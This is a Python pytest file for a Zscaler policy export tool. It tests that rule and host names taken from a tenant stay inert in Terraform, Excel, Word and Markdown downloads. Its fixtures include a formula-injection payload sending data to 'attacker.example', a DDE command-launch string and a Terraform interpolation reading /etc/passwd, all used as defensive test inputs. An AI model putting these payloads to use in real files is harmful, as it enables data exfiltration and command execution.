"""Every download keeps its shape whatever text the tenant holds.

Rule, dictionary, host and user names come from the tenant (any ZIA
admin can set them) or from an uploaded pack. Whatever they contain, a
download must still parse as what it claims to be, carry the name
exactly, and never turn the name into something live:

  - Terraform: strict HCL (tests/hcl_strict.py); a name never becomes an
    interpolation, a directive or an extra block, even through a comment;
  - Excel: no text cell starts like a formula, lists included;
  - Word: an XML-illegal character in a name does not fail the document;
  - Markdown: a pipe or a line break in a name does not add a column or
    end a table row.

Fakes only; no tenant, no network, no clock or randomness in assertions.
"""
from __future__ import annotations

import base64
import io
import re
import zipfile
from xml.etree import ElementTree as ET

import pytest

import bypass_report as br
import detection_health as dh
import dlp_efficacy
import pack_deploy as pd
import pack_export as pe
import pack_library as pl
import pack_terraform as ptf
import policy_exports as pex
import report_docx
import ssl_flow as sf
import xlsx_writer as xw
from hcl_strict import HCLError, parse as parse_hcl, string_value
from test_csv_injection import FakeCl
from test_pack_export import _source
from test_policy_exports import ALL, ROUTES, ReadOnlyClient

FORMULA = '=HYPERLINK("http://attacker.example/?d="&A1,"Click")'
TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
LINE_BREAKS = ["\n", "\r\n", "\r", " ", " ", "\x0b", "\x0c", "\x85"]
# Interpolations the generator itself writes: references, never tenant text.
OWN_REFERENCE = re.compile(r"^(var\.[a-z_]+|(data\.)?zia_[a-z_]+\.[a-z0-9_]+\.(id|tenant_id))$")
PLAIN_NUMBER = re.compile(r"[+-]?(\d+(\.\d*)?|\.\d+)([eE][+-]?\d+)?")
INJECTED_BLOCK = 'resource "zia_rule_labels" "pwn" {\n  name = "x"\n}\n#'


# ---------------------------------------------------------------------------
# The strict HCL checker itself
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("text", [
    'a = "x\ny"\n',                 # newline inside a quoted string
    'a = "x\\q"\n',                 # unknown escape
    'a = "${"\n',                   # unterminated interpolation
    'b {\n  a = 1\n',               # unclosed block
    'a = 1 b = 2\n',                # two attributes on one line
    'a = [1,\n',                    # unterminated list
    'a = 1\na = 2\n',               # duplicate attribute
])
def test_the_strict_hcl_checker_refuses_what_terraform_refuses(text):
    """ASVS V5.3.1 · CWE-116: the HCL checker used below refuses malformed HCL (negative cases)."""
    # Arrange: text Terraform would refuse.  Act / Assert:
    with pytest.raises(HCLError):
        parse_hcl(text)


def test_the_strict_hcl_checker_reports_live_template_sequences():
    """ASVS V5.3.1 · CWE-94: the checker separates live ${...}/%{...} from their $${ / %%{ escapes."""
    interps, directives = parse_hcl('a = "x $${lit} %%{lit} ${var.a} %{ if true }y%{ endif }"\n')
    assert interps == ["var.a"]
    assert directives == ["if true", "endif"]


# ---------------------------------------------------------------------------
# Terraform
# ---------------------------------------------------------------------------

HOSTILE_STRINGS = [
    '${file("/etc/passwd")}', "%{ if true }x%{ endif }", "$${already escaped}", "%%{x}", 'say "hi"',
    "back\\slash", "trailing $", "trailing %", "$", "${", "cr\rhere", "lf\nhere", "tab\there", "emoji \U0001F600",
    "", "x" * 2048,
]


@pytest.mark.parametrize("s", HOSTILE_STRINGS)
def test_hcl_str_keeps_every_string_verbatim_and_never_live(s):
    """ASVS V5.3.1 · CWE-94 · CWE-116: a quoted Terraform string reads back exactly as the tenant wrote it, never as a template."""
    # Arrange: s.  Act:
    literal = ptf.hcl_str(s)
    # Assert: one valid literal, no live sequence, the same value.
    assert string_value(literal) == s


def _hostile_source(rule_name):
    client = _source()
    client.zia.dlp_web_rules.items[1].name = rule_name
    client.zia.dlp_web_rules.items[1].description = 'desc ${timestamp()} %{ for x in [1] }y%{ endfor }\nline two'
    return client


def _assert_strict(files, where):
    for name, text in files.items():
        if not name.endswith(".tf"):
            continue
        interps, directives = parse_hcl(text)      # raises on any syntax error
        live = [i for i in interps if not OWN_REFERENCE.match(i)]
        assert not live, f"{where}/{name}: tenant text became live interpolation: {live}"
        assert not directives, f"{where}/{name}: tenant text became a template directive: {directives}"
        assert ptf.hcl_fmt(text) == text, f"{where}/{name} is not terraform fmt-clean"
        assert not re.search(r'^resource "zia_rule_labels"', text, re.M), f"{where}/{name}: a name added a block"


@pytest.mark.parametrize("parts,deps", [(None, True), (["dictionaries"], True), (["engines"], False),
                                        (["rules"], False), (["rules"], True)])
def test_every_exported_terraform_part_is_strict_hcl_with_hostile_names(parts, deps):
    """ASVS V5.3.1 · CWE-94 · CWE-116: Export from tenant's Terraform (whole zip and each part) parses and keeps tenant text inert."""
    # Arrange
    kw = {"parts": parts, "include_dependencies": deps} if parts else {}
    res = pe.export_pack(_hostile_source("Web-PCI ${path.module} %{x}"), tenant_label="acme ${x}", **kw)
    assert res["status"] == "ready", res
    # Act
    name, data, index = pe.zip_export(res["pack"], "both")
    # Assert: the zip, every Terraform file in it, and every part served on its own.
    z = zipfile.ZipFile(io.BytesIO(data))
    assert z.testzip() is None
    _assert_strict({n: z.read(n).decode() for n in z.namelist()}, name)
    for f in index:
        member = pe.zip_member(data, f["path"])
        assert member is not None, f
        if f["format"] == "terraform":
            _assert_strict({f["path"]: member.decode()}, "part")


def _saved_pack_and_gap_report(rule_name, tmp_path):
    res = pe.export_pack(_hostile_source(rule_name), tenant_label="acme")
    fname, data = pe.zip_pack(res["pack"])
    loaded = pl.assemble_pack([{"name": fname, "content": base64.b64encode(data).decode(), "encoding": "base64"}])
    saved = pl.save_pack(loaded, root=str(tmp_path))
    target = _hostile_source(rule_name)          # the rule already exists there: gap mode imports it
    rep = pd.preflight(target, [{"id": saved["id"], "dir": saved["dir"]}], writes_enabled=True)
    return {"id": saved["id"], "dir": saved["dir"]}, rep


@pytest.mark.parametrize("brk", LINE_BREAKS, ids=[repr(b) for b in LINE_BREAKS])
def test_a_line_break_in_a_tenant_name_cannot_add_a_block_to_the_gap_workspace(brk, tmp_path):
    """ASVS V5.3.1 · CWE-94 · CWE-117: a rule name with a line break stays inside its imports.tf comment (no injected resource)."""
    # Arrange: a rule whose name carries a whole resource block after a line break.
    name = "Web-Projects" + brk + INJECTED_BLOCK.replace("\n", brk)
    pack, rep = _saved_pack_and_gap_report(name, tmp_path)
    assert any(i["kind"] == "policy" and i["name"] == name for i in rep["items"])
    # Act
    files = ptf.generate(pack, report=rep, assessor="Jane Doe")
    # Assert: imports.tf holds only import blocks and one-line comments.
    assert "imports.tf" in files
    _assert_strict(files, "gap")
    blocks = re.findall(r"^(\w+)\s*(?:\"[^\"]*\"\s*)*\{", files["imports.tf"], re.M)
    assert set(blocks) == {"import"}, blocks


@pytest.mark.parametrize("bad", ["x\ny", "x\r\ny", "x y"])
def test_hcl_comment_is_always_one_line(bad):
    """ASVS V5.3.1 · CWE-94: hcl_comment folds every line break a reader could honour (boundary cases)."""
    assert "\n" not in ptf.hcl_comment(bad) and "\r" not in ptf.hcl_comment(bad) and " " not in ptf.hcl_comment(bad)
    assert ptf.hcl_comment("plain name") == "plain name" and ptf.hcl_comment(None) == ""


def test_a_carriage_return_in_a_name_survives_into_the_terraform(tmp_path):
    """ASVS V5.3.1 · CWE-116: Terraform carries a name exactly; a CR is escaped, not dropped."""
    # Arrange
    res = pe.export_pack(_hostile_source("Web\rPCI"), tenant_label="acme")
    # Act
    _, files = pe.terraform_files(res["pack"], "Jane Doe")
    # Assert
    names = [string_value(m.group(1)) for m in re.finditer(r'^\s*name\s*=\s*(".*")$', files["rules.tf"], re.M)]
    assert "Web\rPCI" in names


def test_names_survive_the_pack_round_trip_byte_for_byte(tmp_path):
    """ASVS V5.1.4 · CWE-20: export → library import → plan keeps every hostile rule name unchanged."""
    # Arrange
    weird = 'R ${x} %{y} "q" \\ | =1+1 \U0001F600'
    # Act
    pack, rep = _saved_pack_and_gap_report(weird, tmp_path)
    # Assert
    assert weird in {i["name"] for i in rep["items"] if i["kind"] == "policy"}


# ---------------------------------------------------------------------------
# Excel
# ---------------------------------------------------------------------------

def _sheet_texts(data):
    z = zipfile.ZipFile(io.BytesIO(data))
    out = []
    for n in z.namelist():
        if n.startswith("xl/worksheets/"):
            root = ET.fromstring(z.read(n))
            ns = {"m": "http://schemas.openxmlformats.org/spreadsheetml/2006/main"}
            assert not root.findall(".//m:f", ns), "a formula cell"
            out += ["".join(t.itertext()) for t in root.findall(".//m:is", ns)]
    return out


def _formula_like(texts):
    return [t for t in texts if t[:1] in TRIGGERS and not PLAIN_NUMBER.fullmatch(t)]


@pytest.mark.parametrize("container", [list, tuple, set, frozenset])
@pytest.mark.parametrize("first", [FORMULA, "+cmd|' /C calc'!A0", "-2+3", "@SUM(1)", "\tx", "\rx"])
def test_a_list_cell_is_neutralised_like_any_text_cell(container, first):
    """ASVS V5.3.1 · CWE-1236 · WSTG-INPV-11: a cell built from a list of tenant names never starts like a formula."""
    # Arrange
    wb = xw.Workbook(title="t")
    wb.add_sheet("S", columns=["Names"], rows=[[container([first])]])
    # Act
    texts = _sheet_texts(wb.to_bytes())
    # Assert
    assert not _formula_like(texts), texts


def test_a_list_cell_is_capped_at_excels_cell_limit_and_plain_lists_are_unchanged():
    """ASVS V5.3.1 · CWE-1236: a list cell obeys Excel's 32,767-character limit; a harmless list reads as before (boundary)."""
    # Arrange / Act
    long = xw.cell_text(["y" * (xw.MAX_CELL_CHARS + 10)])
    exact = xw.cell_text(["z" * xw.MAX_CELL_CHARS])
    # Assert
    assert len(long) == xw.MAX_CELL_CHARS and long.endswith(xw.TRUNCATED)
    assert exact == "z" * xw.MAX_CELL_CHARS
    assert xw.cell_text(["a", None, "", "b"]) == "a\nb" and xw.cell_text([]) == ""


def test_a_tenant_service_name_in_a_policy_workbook_list_cell_is_not_a_formula():
    """ASVS V5.3.1 · CWE-1236 · WSTG-INPV-11: the Cloud Firewall workbook's service lists neutralise tenant names."""
    # Arrange: a network service group whose first service is named like a formula.
    routes = dict(ROUTES)
    routes["/zia/networkServiceGroups"] = [{"id": 1, "name": "Web services", "services": [{"id": 6, "name": FORMULA}]}]
    routes["/zia/networkServices"] = [{"id": 6, "name": FORMULA, "type": "CUSTOM", "destTcpPorts": [{"start": 443}]}]
    sc = pex.scope_for(**ALL)
    picked, _ = pex.pick(sc, ["firewall"])
    # Act
    out = pex.run(ReadOnlyClient(routes), sc, picked, "xlsx", tenant_label="acme")
    # Assert
    texts = _sheet_texts(out["artifact"][2])
    assert "'" + FORMULA in texts
    assert not _formula_like(texts)


# ---------------------------------------------------------------------------
# Word
# ---------------------------------------------------------------------------

XML_ILLEGAL = ["\x0b", "\x01", "\x00", "\ud800", "￾"]


def _bypass_report(bad):
    name = f"Rule{bad}name"
    rule = {"id": 1, "name": name, "order": 1, "state": "ENABLED", "description": name, "action": "ALLOW", "urls": [f"ex{bad}.com"]}
    ssl = {"id": 2, "name": name, "order": 1, "state": "ENABLED", "action": {"type": "DO_NOT_DECRYPT"}, "urls": ["bank.example"]}
    return br.generate_bypass_report(FakeCl({"/zia/urlFilteringRules": [rule], "/zia/sslInspectionRules": [ssl]}))


def _docx_text(data):
    z = zipfile.ZipFile(io.BytesIO(data))
    assert z.testzip() is None
    for n in z.namelist():
        if n.endswith((".xml", ".rels")):
            ET.fromstring(z.read(n))
    return "".join(ET.fromstring(z.read("word/document.xml")).itertext())


def _word_bypass(bad, tmp_path):
    out = tmp_path / "b.docx"
    br.to_docx(_bypass_report(bad), str(out))
    return out.read_bytes()


def _word_efficacy(bad, tmp_path):
    return dlp_efficacy.export_docx({"dictionaries": [{"id": 1, "name": f"Rule{bad}name", "type": "CUSTOM", "reasons": [f"why{bad}"]}],
                                     "engines": [{"id": 2, "name": f"Rule{bad}name"}]})


def _word_assessment(bad, tmp_path):
    out = tmp_path / "a.docx"
    checks = [{"id": "dlp_1", "section": "DLP", "label": f"Rule{bad}name", "status": "FAIL",
               "detail": f"Rule Rule{bad}name allows uploads. Best Practice: block", "severity": "high"}]
    report_docx.generate_report(checks, {"org": f"Acme{bad}"}, str(out))
    return out.read_bytes()


@pytest.mark.parametrize("writer", [_word_bypass, _word_efficacy, _word_assessment], ids=["bypass", "efficacy", "assessment"])
@pytest.mark.parametrize("bad", XML_ILLEGAL, ids=[repr(b) for b in XML_ILLEGAL])
def test_every_word_export_opens_whatever_characters_a_tenant_name_holds(writer, bad, tmp_path):
    """ASVS V5.3.1 · CWE-116 · CWE-20: an XML-illegal character in tenant text is dropped; the Word file still builds and parses."""
    # Act
    text = _docx_text(writer(bad, tmp_path))
    # Assert: the name is there, without the character XML cannot carry.
    assert "Rulename" in text


def test_the_word_endpoint_answers_200_for_a_name_with_a_control_character():
    """ASVS V5.3.1 · CWE-20 · WSTG-INPV-11: POST /api/report/docx returns a parseable document, not a 500."""
    from fastapi.testclient import TestClient
    import dlp_api_server as srv
    # Arrange
    body = {"checks": [{"id": "dlp_1", "sec": "DLP", "section": "DLP", "label": "Rule\x0bname", "status": "FAIL",
                        "detail": "Rule\x01name", "severity": "high"}], "metadata": {"org": "Acme"}}
    # Act
    r = TestClient(srv.app).post("/api/report/docx", json=body)
    # Assert
    assert r.status_code == 200, r.text[:300]
    assert "Rulename" in _docx_text(r.content)


def test_clean_tree_keeps_structure_and_harmless_values():
    """ASVS V5.3.1 · CWE-116: clean_tree only drops XML-illegal characters (negative case: clean data is unchanged)."""
    data = {"a": ["x", ("y", 1), {"k\x01": "v\x0b"}], "n": None, "f": 1.5, "b": True}
    assert xw.clean_tree(data) == {"a": ["x", ("y", 1), {"k": "v"}], "n": None, "f": 1.5, "b": True}
    clean = {"a": ["Block SSN", "é中😀"], "n": 3}
    assert xw.clean_tree(clean) == clean


# ---------------------------------------------------------------------------
# Markdown
# ---------------------------------------------------------------------------

def _cells(line):
    s = line.strip()
    s = s[1:] if s.startswith("|") else s
    s = s[:-1] if s.endswith("|") and not s.endswith("\\|") else s
    return re.split(r"(?<!\\)\|", s)


def _broken_rows(md):
    """Rows whose cell count differs from their table's header, and rows a
    line break cut (the next line is not a row and not blank)."""
    lines = md.split("\n")
    bad = []
    for i in range(len(lines) - 1):
        if "|" in lines[i] and re.match(r"^\|?\s*:?-{3,}", lines[i + 1]):
            want = len(_cells(lines[i]))
            j = i + 2
            while j < len(lines) and lines[j].startswith("|"):
                if len(_cells(lines[j])) != want:
                    bad.append(lines[j])
                j += 1
            if j < len(lines) and lines[j].strip() and not lines[j].startswith(("#", "-", "_")):
                bad.append(lines[j])
    return bad


def _md_ssl_flow(name):
    ssl = [{"id": 1, "name": name, "order": 1, "state": "ENABLED", "action": {"type": "DECRYPT"}}]
    dlp = [{"id": 2, "name": name, "order": 1, "state": "ENABLED", "action": "BLOCK", "dlp_engines": [{"id": 1}]}]
    return sf.to_markdown(sf.generate_ssl_flow_report(FakeCl({"/zia/sslInspectionRules": ssl, "/zia/webDlpRules": dlp})))


def _md_detection_health(name):
    rep = {"summary": {}, "settings": {}, "days": 30, "incident_count": 1, "findings": [],
           "destinations": [{"name": name, "incidents": 1, "users": 1, "closed": 1, "not_real": 0, "real": 1, "rules": [name]}],
           "users": [{"name": name, "department": name, "incidents": 1, "closed": 1, "not_real": 0, "real": 1, "destinations": [[name, 1]]}],
           "rules": [{"name": name, "channel": "web", "state": "ENABLED", "incidents": 1, "closed": 1, "not_real": 0, "fp_rate_pct": 0, "status": "healthy"}],
           "dictionaries": [{"name": name, "incidents": 1, "closed": 1, "not_real": 0, "fp_rate_pct": 0, "why": [name], "fix": name}]}
    return dh.to_markdown(rep, "acme")


def _md_bypass(name):
    rule = {"id": 1, "name": name, "order": 1, "state": "ENABLED", "description": name, "action": "ALLOW", "urls": ["example.com"]}
    return br.to_markdown(br.generate_bypass_report(FakeCl({"/zia/urlFilteringRules": [rule]})))


@pytest.mark.parametrize("writer", [_md_ssl_flow, _md_detection_health, _md_bypass], ids=["ssl_flow", "detection_health", "bypass"])
@pytest.mark.parametrize("name", ["Allow | Finance", "Line one\nline two", "a\r\nb | c", "trailing \\", "plain name"])
def test_a_tenant_name_never_breaks_a_markdown_table(writer, name):
    """ASVS V5.3.1 · CWE-116: a pipe or line break in tenant text stays inside its Markdown table cell (plain name as control)."""
    # Act
    md = writer(name)
    # Assert
    assert "|" in md
    assert not _broken_rows(md), _broken_rows(md)[:3]


# ---------------------------------------------------------------------------
# A lone surrogate: a code point UTF-8 cannot carry
# ---------------------------------------------------------------------------

LONE = "R\ud800x"


def test_a_lone_surrogate_in_a_rule_name_still_exports_and_reads_back_identically(tmp_path):
    """ASVS V5.3.1 · CWE-176 · CWE-20: Export from tenant builds valid UTF-8 JSON and Terraform; the JSON name round-trips exactly."""
    # Arrange
    res = pe.export_pack(_hostile_source(LONE), tenant_label="acme")
    # Act
    name, data, index = pe.zip_export(res["pack"], "both")
    # Assert: every member is UTF-8, the JSON gives the identical name back, the Terraform parses.
    z = zipfile.ZipFile(io.BytesIO(data))
    texts = {n: z.read(n).decode("utf-8") for n in z.namelist()}
    policies = next(t for n, t in texts.items() if n.endswith("configs/dlp_policies.json"))
    import json
    assert LONE in {p["name"] for p in json.loads(policies)}
    _assert_strict(texts, name)
    assert "R�x" in texts[next(n for n in texts if n.endswith("-terraform/rules.tf"))]


@pytest.mark.parametrize("value,want", [(LONE, "R�x"), ("=" + LONE, "'=R�x"), ("plain", "plain"), ("", ""), (None, None)])
def test_csv_cells_are_always_utf8_writable(value, want):
    """ASVS V5.3.1 · CWE-176 · CWE-1236: csv_safe turns a lone surrogate into U+FFFD so the CSV download cannot fail (boundary cases)."""
    import csv_safe
    out = csv_safe.safe_cell(value)
    assert out == want
    if isinstance(out, str):
        out.encode("utf-8")


@pytest.mark.parametrize("writer", [_md_ssl_flow, _md_detection_health, _md_bypass], ids=["ssl_flow", "detection_health", "bypass"])
def test_a_pipe_in_a_tenant_name_is_escaped_exactly_once_in_markdown(writer):
    """ASVS V5.3.1 · CWE-116: two escaping layers must not stack; a pipe in a name is written as one escaped pipe, never a doubled backslash."""
    # Act
    md = writer("Allow | Finance")
    # Assert
    assert "Allow \\| Finance" in md and "\\\\|" not in md
